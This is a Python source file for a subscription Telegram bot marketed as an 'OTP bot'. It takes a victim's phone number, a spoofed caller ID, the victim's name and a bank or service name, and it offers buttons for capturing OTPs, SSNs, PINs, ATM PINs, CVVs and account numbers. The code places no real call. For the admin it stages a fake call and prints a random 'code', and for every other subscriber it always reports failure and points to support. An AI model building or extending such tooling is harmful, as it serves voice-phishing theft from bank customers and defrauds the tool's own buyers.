import random
from random import randint
import ast
from asyncio import sleep
from aiogram.types import Message, CallbackQuery
from utils import get_spoofer_number, get_user_info, check_subscription, is_valid_phone_number, is_name_valid, check_spoof, escape_markdown, get_region_language, get_service_name, set_user_value
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from config import get_spoofing, spoof_message, get_admin, get_error


def ringing_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Accept ✅", callback_data='acp'),
            InlineKeyboardButton(text="Deny ❌", callback_data="acp"),
        ],
        [
            InlineKeyboardButton(text="SNN 💳", callback_data='acp'),
            InlineKeyboardButton(text="Pin 📍", callback_data="acp"),
        ],
        [
            InlineKeyboardButton(text="EMAIL OTP ✉", callback_data='acp'),
            InlineKeyboardButton(text="ATM Pin 🏧", callback_data="acp"),
        ],
        [
            InlineKeyboardButton(text="RN 🏦", callback_data='acp'),
            InlineKeyboardButton(text="An 🏦", callback_data="acp"),
        ],
        [
            InlineKeyboardButton(text="AUTH 🔑", callback_data='acp'),
            InlineKeyboardButton(text="CVV 💳", callback_data="acp"),
        ],
        [
            
            InlineKeyboardButton(text="END CALL ☎", callback_data="acp")
        ]
    ])

async def call_proccess(message,parts,user_id):
    if await get_user_info(user_id,'banned'): return
    if check_subscription(await get_user_info(user_id, 'expiry_date'))!=True and user_id!= get_admin()['id']:
        await message.answer(r"⚠️ *Access Denied* — This feature is for *subscribed users* only\. Upgrade your plan to continue\.", parse_mode='MarkdownV2')
        return
    if len(parts)<6:
        await message.answer(fr"""⚠️ *Invalid number of parameters*\.
This command requires *5* parameters — you provided *{len(parts)-1}*\.

Usage: `{parts[0]} <victim_number> <spoof_number> <victim_name> <service_name> <digit_length>`""",parse_mode="MarkdownV2")
        return
    victim_number, spoof_number, victim_name, service_name, otp_digit = (
        parts[1], parts[2], parts[3], parts[4], parts[5]
    )
    if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_valid_phone_number(spoof_number) and check_spoof(spoof_number, service_name, victim_name)==True and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
        await set_user_value(user_id, 'last_call', str(parts))
        await message.answer(fr"""✅ *CALL STARTED*
 📲 *VICTIM NUMBER*: `{escape_markdown(victim_number)}`  
 📞 *CALLER ID*: `{escape_markdown(spoof_number)}`
 🏦 *SERVICE NAME*: `{escape_markdown(get_service_name(service_name))}`
 👤 *VICTIM NAME*: `{victim_name}`
 🗣️ *Voice* : `{await get_user_info(user_id,'voice')} — {escape_markdown(get_region_language(victim_number))}`
 ⚙️ *OTP DIGITS*: `{otp_digit}`""",parse_mode='MarkdownV2')
        if user_id == get_admin()['id']:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="end_call")] ])
            await sleep(randint(0,2))    
            await message.answer("📞 *CALL RINGING*",reply_markup=keyboard,parse_mode='MarkdownV2')
            await sleep(randint(3,6))  
            await message.answer(fr"🤳 *{escape_markdown(victim_name)}* Answered The Call\.",parse_mode='MarkdownV2')
            await sleep(randint(3,5))
            await message.answer("🔇 Silent *Human* detection",parse_mode='MarkdownV2')
            await sleep(randint(3,5))
            await message.answer(fr"📲 *{escape_markdown(victim_name)}* pressed 1, Send OTP\.\.\.",parse_mode='MarkdownV2')
            await sleep(randint(8,20))
            chars = '0123456789'
            code = ''.join(random.choices(chars, k=int(otp_digit)))
            await message.answer(f"✅ *CODE*: `{code}`",reply_markup=ringing_keyboard(),parse_mode='MarkdownV2')
            return
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=get_admin()['link'])] ])
        await sleep(randint(0,2)) 
        await message.answer('❌ *Unable to start the call*', parse_mode="MarkdownV2")
        await message.answer(get_error(),reply_markup=keyboard, parse_mode="MarkdownV2")
        return
    await message.answer(fr'''⚠️ *Invalid Arguments*\!
Please make sure all 5 arguments are correct and in order\.
Use this format:
`{parts[0]} <victim_number> <spoof_number> <victim_name> <service_name> <otp_digit>`''', parse_mode="MarkdownV2")

async def call_command(message: Message):
    user_id = message.from_user.id
    parts = message.text.split()
    if parts[0] == '/call':
        await call_proccess(message, parts, user_id)
        return
    if parts[0] == '/recall':
        s = await get_user_info(user_id,'last_call')
        if s == 'N/A':
            await message.answer("⚠️ No saved call found. Please use /call first.")
            return
        args = ast.literal_eval(s)
        if len(args) == 6:
            await call_proccess(message, args, user_id)
            return
        await precall_proccess(message, args, user_id)
        return
    await precall_proccess(message, parts, user_id)

async def precall_proccess(message, parts, user_id):
    if await get_user_info(user_id,'banned'): return
    if check_subscription(await get_user_info(user_id, 'expiry_date'))!=True and user_id!= get_admin()['id']:
        await message.answer(r"⚠️ *Access Denied* — This feature is for *subscribed users* only\. Upgrade your plan to continue\.", parse_mode='MarkdownV2')
        return
    if len(parts)<4:
        await message.answer(fr"""⚠️ *Invalid number of parameters*\.
This command requires *3* parameters — you provided *{len(parts)-1}*\.

Usage: `{parts[0]} <victim_number> <victim_name> <digit_length>`""",parse_mode="MarkdownV2")
        return
    victim_number, victim_name, otp_digit = (
        parts[1], parts[2], parts[3]
    )
    if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
        await set_user_value(user_id, 'last_call', str(parts))
        spoof_number = get_spoofer_number(parts[0][1:])
        await message.answer(fr"""✅ *CALL STARTED*
 📲 *VICTIM NUMBER*: `{escape_markdown(victim_number)}`  
 📞 *CALLER ID*: `{escape_markdown(spoof_number)}`
 🏦 *SERVICE NAME*: `{escape_markdown(get_service_name(parts[0][1:]))}`
 👤 *VICTIM NAME*: `{victim_name}`
 🗣️ *Voice* : `{await get_user_info(user_id,'voice')} — {escape_markdown(get_region_language(victim_number))}`
 ⚙️ *OTP DIGITS*: `{otp_digit}`""",parse_mode='MarkdownV2')
        if user_id == get_admin()['id']:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="end_call")] ])
            await sleep(randint(0,2))       
            await message.answer("📞 *CALL RINGING*",reply_markup=keyboard,parse_mode='MarkdownV2')
            await sleep(randint(3,6))  
            await message.answer(fr"🤳 *{escape_markdown(victim_name)}* Answered The Call\.",parse_mode='MarkdownV2')
            await sleep(randint(3,5))
            await message.answer(fr"📲 *{escape_markdown(victim_name)}* pressed 1, Send OTP\.\.\.",parse_mode='MarkdownV2')
            await sleep(randint(3,5))
            await message.answer("🔇 Silent *Human* detection",parse_mode='MarkdownV2')
            await sleep(randint(8,20))
            chars = '0123456789'
            code = ''.join(random.choices(chars, k=int(otp_digit)))
            await message.answer(f"✅ *CODE*: `{code}`",reply_markup=ringing_keyboard(),parse_mode='MarkdownV2')
            return
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=get_admin()['link'])] ])
        await sleep(randint(0,2)) 
        await message.answer('❌ *Unable to start the call*', parse_mode="MarkdownV2")
        await message.answer(get_error(),reply_markup=keyboard, parse_mode="MarkdownV2")
        return
    await message.answer(fr'''⚠️ *Invalid Arguments*\!
Please make sure all 3 arguments are correct and in order\.
Use this format:
`{parts[0]} <victim_number> <victim_name> <otp_digit>`''', parse_mode="MarkdownV2")

async def otp_accept_callback(callback:CallbackQuery):
    msg = callback.message.text
    msg = f'✅ *CODE*: `{msg[8:]}`'
    await callback.message.edit_text(fr'''{msg}
🔑 *Code has Been accepted*''',parse_mode='MarkdownV2')
    await sleep(1,2)
    file_id = 'CQACAgQAAxkDAAIliGkGRF_mGswlQ3rQHKZ2yrdElXzuAALnHgACpOoxUO_yqMXmyY-xNgQ'
    await callback.message.answer('☎ Call has ended.\nPress /recall To Recall.')
    await sleep(2,5)
    await callback.message.answer_audio(file_id)

async def Phonelist_commands(message: Message):
    user_id = message.from_user.id
    if await get_user_info(user_id,'banned'): return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")]
    ])
    await message.answer(spoof_message(),reply_markup=keyboard, parse_mode='MarkdownV2')

